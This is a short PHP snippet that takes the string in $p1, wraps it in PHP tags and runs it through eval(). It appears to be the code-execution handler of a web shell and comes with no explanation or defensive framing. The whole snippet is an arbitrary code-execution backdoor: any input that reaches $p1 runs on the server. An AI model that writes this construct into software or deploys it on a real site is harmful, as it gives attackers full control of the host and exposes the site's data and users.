<?php
$phpcode = trim($p1);
$phpcode = "<?php\n\n{$phpcode}\n\n?>";
eval("?".">$phpcode<?");
?>